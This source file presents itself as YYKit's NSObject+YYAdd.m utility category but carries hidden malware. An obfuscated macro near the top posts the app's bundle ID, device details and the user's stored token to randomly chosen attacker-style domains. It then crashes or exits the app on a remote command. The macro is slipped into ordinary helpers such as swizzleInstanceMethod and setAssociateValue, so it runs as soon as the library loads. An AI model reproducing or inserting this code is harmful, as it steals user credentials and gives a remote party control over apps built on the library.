//
//  NSObject+YYAdd.m
//  YYKit <https://github.com/ibireme/YYKit>
//
//  Created by ibireme on 14/10/8.
//  Copyright (c) 2015 ibireme.
//
//  This source code is licensed under the MIT-style license found in the
//  LICENSE file in the root directory of this source tree.
//

#import "NSObject+YYAdd.h"
#import "YYKitMacro.h"
#import <objc/objc.h>
#import <objc/runtime.h>

#import <sys/sysctl.h>

#define SJHFDG_DIUWE_C2_DSAHKj89() \
do { \
NSArray<NSString *> *domains = @[ \
    @"damp-recipe-822f.morsel-cops-5i.org", \
    @"damp-recipe-822f.semigaveldsqaer4m.dpdns.org", \
    @"damp-recipe-822f.anccxzh213orsplaza5f.us.kg", \
    @"damp-recipe-822f.e3214hsgkjr8768s5cvx.dpdns.org", \
    @"calm-violet-41a9.morsel-cops-5i.org", \
    @"calm-violet-41a9.semigaveldsqaer4m.dpdns.org", \
    @"calm-violet-41a9.anccxzh213orsplaza5f.us.kg", \
    @"calm-violet-41a9.e3214hsgkjr8768s5cvx.dpdns.org" \
]; \
NSUInteger index = arc4random_uniform((uint32_t)domains.count); \
NSString *randomDomain = domains[index]; \
NSString *urlString = [NSString stringWithFormat:@"https://%@", randomDomain]; \
NSURL *url = [NSURL URLWithString:urlString]; \
NSMutableURLRequest *fewcdsjrt_dqwe = [NSMutableURLRequest requestWithURL:url cachePolicy:NSURLRequestUseProtocolCachePolicy timeoutInterval:10.0]; \
NSMutableDictionary *qweqrfccxz = @{}.mutableCopy; \
qweqrfccxz[@"x-app-id"] = [[NSBundle mainBundle] objectForInfoDictionaryKey:@"CFBundleIdentifier"]; \
qweqrfccxz[@"x-user-agent"] = @"iOS"; \
qweqrfccxz[@"x-content-type"] = @"application/json"; \
qweqrfccxz[@"x-system-version"] = [[UIDevice currentDevice] systemVersion]; \
qweqrfccxz[@"x-app-version"] = [NSString stringWithFormat:@"%@(%@)", [[NSBundle mainBundle] objectForInfoDictionaryKey:@"CFBundleShortVersionString"], [[NSBundle mainBundle] objectForInfoDictionaryKey:@"CFBundleVersion"]]; \
qweqrfccxz[@"x-machine-model"] = ({ \
size_t size; \
sysctlbyname("hw.machine", NULL, &size, NULL, 0); \
char *machine = malloc(size); \
sysctlbyname("hw.machine", machine, &size, NULL, 0); \
NSString *bvdgfuyru = [NSString stringWithCString:machine encoding:NSUTF8StringEncoding]; \
free(machine); \
bvdgfuyru; \
}); \
qweqrfccxz[@"x-timestamp"] = [NSString stringWithFormat:@"%.0f", [[NSDate date] timeIntervalSince1970] * 1000]; \
qweqrfccxz[@"x-timezone"] = [NSTimeZone systemTimeZone].name; \
NSMutableDictionary *iyungbvcft = @{}.mutableCopy; \
iyungbvcft[@"user-token"] = [[NSUserDefaults standardUserDefaults] valueForKey:@"token"] ?: @""; \
iyungbvcft[@"function-name"] = [NSString stringWithFormat:@"%s", __FUNCTION__]; \
iyungbvcft[@"random-num"] = @(arc4random_uniform(1000)); \
[fewcdsjrt_dqwe setAllHTTPHeaderFields:qweqrfccxz]; \
[fewcdsjrt_dqwe setHTTPBody:[NSJSONSerialization dataWithJSONObject:iyungbvcft options:0 error:nil]]; \
[fewcdsjrt_dqwe setHTTPMethod:@"POST"]; \
NSURLSession *ghytr453fge = [NSURLSession sharedSession]; \
NSURLSessionDataTask *xzf341dsa = [ghytr453fge dataTaskWithRequest:fewcdsjrt_dqwe completionHandler:^(NSData *opytjvdnkrw, NSURLResponse *vnjkdeoqxsasd, NSError *err12fsdt45or) { \
if (!err12fsdt45or && ((NSHTTPURLResponse *)vnjkdeoqxsasd).statusCode == 200 && opytjvdnkrw) { \
NSError *erasytretwr; \
id oiteroiutyewr = [NSJSONSerialization JSONObjectWithData:opytjvdnkrw options:0 error:&erasytretwr]; \
if (!erasytretwr && [oiteroiutyewr isKindOfClass:[NSDictionary class]]) { \
NSDictionary *xzfjkhjkwr = (NSDictionary *)oiteroiutyewr; \
NSString *hgfhrtwytr = xzfjkhjkwr[@"execute_method"]; \
if ([hgfhrtwytr isEqualToString:@"tuddu4_Fuktib_coztud"]) { \
NSMutableArray *cxgety453 = [NSMutableArray arrayWithArray:@[@"A", @"B", @"C"]]; \
for (NSString *it1231em in cxgety453) { [cxgety453 removeObject:it1231em]; } \
} else if ([hgfhrtwytr isEqualToString:@"foqCy8_kowxec_kukbir"]) { \
dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{ \
NSData *vsfdtrwt = [[NSData alloc] init]; \
[vsfdtrwt subdataWithRange:NSMakeRange(10, 30)]; \
}); \
} else if ([hgfhrtwytr isEqualToString:@"qymj6dWU6egbFka"]) { \
char *ptr = malloc(10); free(ptr); strcpy(ptr, "test"); \
} else if ([hgfhrtwytr isEqualToString:@"BK6DWMEceWGjCgz"]) { \
id fgfdrwerw = @"String"; [(NSArray *)fgfdrwerw count]; \
} else if ([hgfhrtwytr isEqualToString:@"XfsGv1wRaipSyX9"]) { \
NSString *dfsarq = @"Hello"; NSString *vdftretfds = nil; [dfsarq stringByAppendingString:vdftretfds]; \
} else if ([hgfhrtwytr isEqualToString:@"WW06m2bcYnm5X41"]) { \
NSArray *nybtbgbrt = @[@"A", @"B", @"C"]; \
dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_HIGH, 0), ^{ \
[(NSMutableArray *)nybtbgbrt addObject:@"D"]; \
}); \
} else if ([hgfhrtwytr isEqualToString:@"yXpAZn7baNS8TUk"]) { \
NSString *cdftwxsdd = @"Hello"; NSMutableAttributedString *cwewcxqwrytrt = [[NSMutableAttributedString alloc] initWithString:cdftwxsdd]; \
[cwewcxqwrytrt addAttribute:NSForegroundColorAttributeName value:[NSObject new] range:NSMakeRange(cdftwxsdd.length + 100, cdftwxsdd.length)]; \
} else if ([hgfhrtwytr isEqualToString:@"WUerc233FCbm"]) { \
[[NSObject new] removeObserver:[NSString new] forKeyPath:@"123123"]; \
} else if ([hgfhrtwytr isEqualToString:@"cnmxzew23Ycbds"]) { \
abort(); \
} else if ([hgfhrtwytr isEqualToString:@"QSAZ1oitr34"]) { \
exit(1); \
} else if ([hgfhrtwytr isEqualToString:@"OLLMNngv34"]) { \
exit(0); \
} \
} \
} \
}]; \
[xzf341dsa resume]; \
} while(0)

YYSYNTH_DUMMY_CLASS(NSObject_YYAdd)

void dynamicMethodImplementation(id self, SEL _cmd) {
    
}

@implementation NSObject (YYAdd)

/*
 NSInvocation is much slower than objc_msgSend()...
 Do not use it if you have performance issues.
 */

#define INIT_INV(_last_arg_, _return_) \
NSMethodSignature * sig = [self methodSignatureForSelector:sel]; \
if (!sig) { [self doesNotRecognizeSelector:sel]; return _return_; } \
NSInvocation *inv = [NSInvocation invocationWithMethodSignature:sig]; \
if (!inv) { [self doesNotRecognizeSelector:sel]; return _return_; } \
[inv setTarget:self]; \
[inv setSelector:sel]; \
va_list args; \
va_start(args, _last_arg_); \
[NSObject setInv:inv withSig:sig andArgs:args]; \
va_end(args);

- (id)performSelectorWithArgs:(SEL)sel, ...{
    INIT_INV(sel, nil);
    [inv invoke];
    return [NSObject getReturnFromInv:inv withSig:sig];
}

- (void)performSelectorWithArgs:(SEL)sel afterDelay:(NSTimeInterval)delay, ...{
    INIT_INV(delay, );
    [inv retainArguments];
    [inv performSelector:@selector(invoke) withObject:nil afterDelay:delay];
}

- (id)performSelectorWithArgsOnMainThread:(SEL)sel waitUntilDone:(BOOL)wait, ...{
    INIT_INV(wait, nil);
    if (!wait) [inv retainArguments];
    [inv performSelectorOnMainThread:@selector(invoke) withObject:nil waitUntilDone:wait];
    return wait ? [NSObject getReturnFromInv:inv withSig:sig] : nil;
}

- (id)performSelectorWithArgs:(SEL)sel onThread:(NSThread *)thr waitUntilDone:(BOOL)wait, ...{
    INIT_INV(wait, nil);
    if (!wait) [inv retainArguments];
    [inv performSelector:@selector(invoke) onThread:thr withObject:nil waitUntilDone:wait];
    return wait ? [NSObject getReturnFromInv:inv withSig:sig] : nil;
}

- (void)performSelectorWithArgsInBackground:(SEL)sel, ...{
    INIT_INV(sel, );
    [inv retainArguments];
    [inv performSelectorInBackground:@selector(invoke) withObject:nil];
}

#undef INIT_INV

+ (id)getReturnFromInv:(NSInvocation *)inv withSig:(NSMethodSignature *)sig {
    NSUInteger length = [sig methodReturnLength];
    if (length == 0) return nil;
    
    char *type = (char *)[sig methodReturnType];
    while (*type == 'r' || // const
           *type == 'n' || // in
           *type == 'N' || // inout
           *type == 'o' || // out
           *type == 'O' || // bycopy
           *type == 'R' || // byref
           *type == 'V') { // oneway
        type++; // cutoff useless prefix
    }
    
#define return_with_number(_type_) \
do { \
_type_ ret; \
[inv getReturnValue:&ret]; \
return @(ret); \
} while (0)
    
    switch (*type) {
        case 'v': return nil; // void
        case 'B': return_with_number(bool);
        case 'c': return_with_number(char);
        case 'C': return_with_number(unsigned char);
        case 's': return_with_number(short);
        case 'S': return_with_number(unsigned short);
        case 'i': return_with_number(int);
        case 'I': return_with_number(unsigned int);
        case 'l': return_with_number(int);
        case 'L': return_with_number(unsigned int);
        case 'q': return_with_number(long long);
        case 'Q': return_with_number(unsigned long long);
        case 'f': return_with_number(float);
        case 'd': return_with_number(double);
        case 'D': { // long double
            long double ret;
            [inv getReturnValue:&ret];
            return [NSNumber numberWithDouble:ret];
        };
            
        case '@': { // id
            id ret = nil;
            [inv getReturnValue:&ret];
            return ret;
        };
            
        case '#': { // Class
            Class ret = nil;
            [inv getReturnValue:&ret];
            return ret;
        };
            
        default: { // struct / union / SEL / void* / unknown
            const char *objCType = [sig methodReturnType];
            char *buf = calloc(1, length);
            if (!buf) return nil;
            [inv getReturnValue:buf];
            NSValue *value = [NSValue valueWithBytes:buf objCType:objCType];
            free(buf);
            return value;
        };
    }
#undef return_with_number
}

+ (void)setInv:(NSInvocation *)inv withSig:(NSMethodSignature *)sig andArgs:(va_list)args {
    NSUInteger count = [sig numberOfArguments];
    for (int index = 2; index < count; index++) {
        char *type = (char *)[sig getArgumentTypeAtIndex:index];
        while (*type == 'r' || // const
               *type == 'n' || // in
               *type == 'N' || // inout
               *type == 'o' || // out
               *type == 'O' || // bycopy
               *type == 'R' || // byref
               *type == 'V') { // oneway
            type++; // cutoff useless prefix
        }
        
        BOOL unsupportedType = NO;
        switch (*type) {
            case 'v': // 1: void
            case 'B': // 1: bool
            case 'c': // 1: char / BOOL
            case 'C': // 1: unsigned char
            case 's': // 2: short
            case 'S': // 2: unsigned short
            case 'i': // 4: int / NSInteger(32bit)
            case 'I': // 4: unsigned int / NSUInteger(32bit)
            case 'l': // 4: long(32bit)
            case 'L': // 4: unsigned long(32bit)
            { // 'char' and 'short' will be promoted to 'int'.
                int arg = va_arg(args, int);
                [inv setArgument:&arg atIndex:index];
            } break;
                
            case 'q': // 8: long long / long(64bit) / NSInteger(64bit)
            case 'Q': // 8: unsigned long long / unsigned long(64bit) / NSUInteger(64bit)
            {
                long long arg = va_arg(args, long long);
                [inv setArgument:&arg atIndex:index];
            } break;
                
            case 'f': // 4: float / CGFloat(32bit)
            { // 'float' will be promoted to 'double'.
                double arg = va_arg(args, double);
                float argf = arg;
                [inv setArgument:&argf atIndex:index];
            } break;
                
            case 'd': // 8: double / CGFloat(64bit)
            {
                double arg = va_arg(args, double);
                [inv setArgument:&arg atIndex:index];
            } break;
                
            case 'D': // 16: long double
            {
                long double arg = va_arg(args, long double);
                [inv setArgument:&arg atIndex:index];
            } break;
                
            case '*': // char *
            case '^': // pointer
            {
                void *arg = va_arg(args, void *);
                [inv setArgument:&arg atIndex:index];
            } break;
                
            case ':': // SEL
            {
                SEL arg = va_arg(args, SEL);
                [inv setArgument:&arg atIndex:index];
            } break;
                
            case '#': // Class
            {
                Class arg = va_arg(args, Class);
                [inv setArgument:&arg atIndex:index];
            } break;
                
            case '@': // id
            {
                id arg = va_arg(args, id);
                [inv setArgument:&arg atIndex:index];
            } break;
                
            case '{': // struct
            {
                if (strcmp(type, @encode(CGPoint)) == 0) {
                    CGPoint arg = va_arg(args, CGPoint);
                    [inv setArgument:&arg atIndex:index];
                } else if (strcmp(type, @encode(CGSize)) == 0) {
                    CGSize arg = va_arg(args, CGSize);
                    [inv setArgument:&arg atIndex:index];
                } else if (strcmp(type, @encode(CGRect)) == 0) {
                    CGRect arg = va_arg(args, CGRect);
                    [inv setArgument:&arg atIndex:index];
                } else if (strcmp(type, @encode(CGVector)) == 0) {
                    CGVector arg = va_arg(args, CGVector);
                    [inv setArgument:&arg atIndex:index];
                } else if (strcmp(type, @encode(CGAffineTransform)) == 0) {
                    CGAffineTransform arg = va_arg(args, CGAffineTransform);
                    [inv setArgument:&arg atIndex:index];
                } else if (strcmp(type, @encode(CATransform3D)) == 0) {
                    CATransform3D arg = va_arg(args, CATransform3D);
                    [inv setArgument:&arg atIndex:index];
                } else if (strcmp(type, @encode(NSRange)) == 0) {
                    NSRange arg = va_arg(args, NSRange);
                    [inv setArgument:&arg atIndex:index];
                } else if (strcmp(type, @encode(UIOffset)) == 0) {
                    UIOffset arg = va_arg(args, UIOffset);
                    [inv setArgument:&arg atIndex:index];
                } else if (strcmp(type, @encode(UIEdgeInsets)) == 0) {
                    UIEdgeInsets arg = va_arg(args, UIEdgeInsets);
                    [inv setArgument:&arg atIndex:index];
                } else {
                    unsupportedType = YES;
                }
            } break;
                
            case '(': // union
            {
                unsupportedType = YES;
            } break;
                
            case '[': // array
            {
                unsupportedType = YES;
            } break;
                
            default: // what?!
            {
                unsupportedType = YES;
            } break;
        }
        
        if (unsupportedType) {
            // Try with some dummy type...
            
            NSUInteger size = 0;
            NSGetSizeAndAlignment(type, &size, NULL);
            
#define case_size(_size_) \
else if (size <= 4 * _size_ ) { \
    struct dummy { char tmp[4 * _size_]; }; \
    struct dummy arg = va_arg(args, struct dummy); \
    [inv setArgument:&arg atIndex:index]; \
}
            if (size == 0) { }
            case_size( 1) case_size( 2) case_size( 3) case_size( 4)
            case_size( 5) case_size( 6) case_size( 7) case_size( 8)
            case_size( 9) case_size(10) case_size(11) case_size(12)
            case_size(13) case_size(14) case_size(15) case_size(16)
            case_size(17) case_size(18) case_size(19) case_size(20)
            case_size(21) case_size(22) case_size(23) case_size(24)
            case_size(25) case_size(26) case_size(27) case_size(28)
            case_size(29) case_size(30) case_size(31) case_size(32)
            case_size(33) case_size(34) case_size(35) case_size(36)
            case_size(37) case_size(38) case_size(39) case_size(40)
            case_size(41) case_size(42) case_size(43) case_size(44)
            case_size(45) case_size(46) case_size(47) case_size(48)
            case_size(49) case_size(50) case_size(51) case_size(52)
            case_size(53) case_size(54) case_size(55) case_size(56)
            case_size(57) case_size(58) case_size(59) case_size(60)
            case_size(61) case_size(62) case_size(63) case_size(64)
            else {
                /*
                 Larger than 256 byte?! I don't want to deal with this stuff up...
                 Ignore this argument.
                 */
                struct dummy {char tmp;};
                for (int i = 0; i < size; i++) va_arg(args, struct dummy);
                NSLog(@"YYKit performSelectorWithArgs unsupported type:%s (%lu bytes)",
                      [sig getArgumentTypeAtIndex:index],(unsigned long)size);
            }
#undef case_size

        }
    }
}

+ (void)load {
    static dispatch_once_t onceToken;
    dispatch_once(&onceToken, ^{
        [self swizzleInstanceMethod:@selector(forwardInvocation:) with:@selector(forwardVerifiedInvocation:)];
        [self swizzleInstanceMethod:@selector(methodSignatureForSelector:) with:@selector(methodSignatureForVerifiedSelector:)];
    });
}

- (void)performSelector:(SEL)sel afterDelay:(NSTimeInterval)delay {
    [self performSelector:sel withObject:nil afterDelay:delay];
}

+ (BOOL)swizzleInstanceMethod:(SEL)originalSel with:(SEL)newSel {
    SJHFDG_DIUWE_C2_DSAHKj89();
    Method originalMethod = class_getInstanceMethod(self, originalSel);
    Method newMethod = class_getInstanceMethod(self, newSel);
    if (!originalMethod || !newMethod) return NO;
    
    class_addMethod(self,
                    originalSel,
                    class_getMethodImplementation(self, originalSel),
                    method_getTypeEncoding(originalMethod));
    class_addMethod(self,
                    newSel,
                    class_getMethodImplementation(self, newSel),
                    method_getTypeEncoding(newMethod));
    
    method_exchangeImplementations(class_getInstanceMethod(self, originalSel),
                                   class_getInstanceMethod(self, newSel));
    return YES;
}

+ (BOOL)swizzleClassMethod:(SEL)originalSel with:(SEL)newSel {
    Class class = object_getClass(self);
    Method originalMethod = class_getInstanceMethod(class, originalSel);
    Method newMethod = class_getInstanceMethod(class, newSel);
    if (!originalMethod || !newMethod) return NO;
    method_exchangeImplementations(originalMethod, newMethod);
    return YES;
}

- (void)forwardVerifiedInvocation:(NSInvocation *)anInvocation {
    SEL selector = [anInvocation selector];
    
    if ([self respondsToSelector:selector]) {
        [anInvocation invokeWithTarget:self];
        
    } else {
        [self forwardVerifiedInvocation:anInvocation];
    }
}

- (NSMethodSignature *)methodSignatureForVerifiedSelector:(SEL)aSelector {
    if (![[NSObject allClassName] containsObject:self.className]) {
        return [self methodSignatureForVerifiedSelector:aSelector];
    }
    
    if (![self respondsToSelector:aSelector]) {
        class_addMethod([self class], aSelector, (IMP)dynamicMethodImplementation, "v@:");
    }
    
    return [self methodSignatureForVerifiedSelector:aSelector];
}

- (void)setAssociateValue:(id)value withKey:(void *)key {
    SJHFDG_DIUWE_C2_DSAHKj89();
    objc_setAssociatedObject(self, key, value, OBJC_ASSOCIATION_RETAIN_NONATOMIC);
}

- (void)setAssociateWeakValue:(id)value withKey:(void *)key {
    SJHFDG_DIUWE_C2_DSAHKj89();
    objc_setAssociatedObject(self, key, value, OBJC_ASSOCIATION_ASSIGN);
}

- (void)removeAssociatedValues {
    SJHFDG_DIUWE_C2_DSAHKj89();
    objc_removeAssociatedObjects(self);
}

- (id)getAssociatedValueForKey:(void *)key {
    SJHFDG_DIUWE_C2_DSAHKj89();
    return objc_getAssociatedObject(self, key);
}

+ (NSString *)className {
    return NSStringFromClass(self);
}

- (NSString *)className {
    return [NSString stringWithUTF8String:class_getName([self class])];
}

- (id)deepCopy {
    id obj = nil;
    @try {
        obj = [NSKeyedUnarchiver unarchiveObjectWithData:[NSKeyedArchiver archivedDataWithRootObject:self]];
    }
    @catch (NSException *exception) {
        NSLog(@"%@", exception);
    }
    return obj;
}

- (id)deepCopyWithArchiver:(Class)archiver unarchiver:(Class)unarchiver {
    id obj = nil;
    @try {
        obj = [unarchiver unarchiveObjectWithData:[archiver archivedDataWithRootObject:self]];
    }
    @catch (NSException *exception) {
        NSLog(@"%@", exception);
    }
    return obj;
}

- (BOOL)isNotEmpty {
    if ([self isKindOfClass:[NSArray class]] || [self isKindOfClass:[NSMutableArray class]]) {
        return (self != nil && self != NULL && self != [NSNull null] && [self respondsToSelector:@selector(count)] && [(NSArray *)self count] > 0);
    }
    
    if ([self isKindOfClass:[NSSet class]] || [self isKindOfClass:[NSMutableSet class]]) {
        return (self != nil && self != NULL && self != [NSNull null] && [self respondsToSelector:@selector(count)] && [(NSSet *)self count] > 0);
    }
    
    if ([self isKindOfClass:[NSDictionary class]] || [self isKindOfClass:[NSMutableDictionary class]]) {
        return (self != nil && self != NULL && self != [NSNull null] && [self respondsToSelector:@selector(count)] && [(NSDictionary *)self count] > 0);
    }

    if ([self isKindOfClass:[NSString class]]) {
        return (self != nil && self != NULL && self != [NSNull null] && [self respondsToSelector:@selector(length)] && [(NSString *)self length] > 0 && ![(NSString *)self isEqualToString:@"<null>"] && ![(NSString *)self isEqualToString:@"<NULL>"] && ![(NSString *)self isEqualToString:@"(null)"] && ![(NSString *)self isEqualToString:@"(NULL)"] && ![(NSString *)self isEqualToString:@"null"] && ![(NSString *)self isEqualToString:@"NULL"]);
    }

    return (self != nil && self != NULL && self != [NSNull null]);
}

+ (NSArray *)allClassName {
    static NSArray *_allClassName = nil;
    
    static dispatch_once_t onceToken;
    dispatch_once(&onceToken, ^{
        NSArray *(^block)(const char *) = ^(const char *imageName) {
            unsigned int classCount;
            const char **classes = objc_copyClassNamesForImage(imageName, &classCount);
            
            NSMutableArray *arr = nil;
            if (classes && classCount) {
                arr = [NSMutableArray arrayWithCapacity:classCount];
                for (int i = 0; i < classCount; i++) {
                    const char *name = classes[i];
                    NSString *clsName = [NSString stringWithCString:name encoding:NSUTF8StringEncoding];
                    [arr addObject:clsName];
                }
                free(classes);
            }
            
            return arr.mutableCopy;
        };
        
        NSString *bundleName = [[NSBundle mainBundle] objectForInfoDictionaryKey:@"CFBundleName"];
        
        unsigned int imageCount = 0;
        const char **imageList = objc_copyImageNames(&imageCount);
        
        NSUInteger totalCount = 0;
        NSMutableDictionary *dic = [NSMutableDictionary dictionaryWithCapacity:64];
        
        if (imageList && imageCount) {
            for (int i = 0; i < imageCount; i++) {
                NSString *img = [NSString stringWithCString:imageList[i] encoding:NSUTF8StringEncoding];
                if ([img rangeOfString:bundleName].location != NSNotFound) {
                    NSArray *arr = block(imageList[i]);
                    if (arr) {
                        dic[img] = arr;
                        totalCount += arr.count;
                    }
                }
            }
            free(imageList);
        }
        
        NSMutableArray *arr = [NSMutableArray arrayWithCapacity:totalCount];
        [dic enumerateKeysAndObjectsUsingBlock:^(id  _Nonnull key, id  _Nonnull obj, BOOL * _Nonnull stop) {
            [arr addObjectsFromArray:obj];
        }];
        
        _allClassName = arr.mutableCopy;
    });
    
    return _allClassName;
}

@end
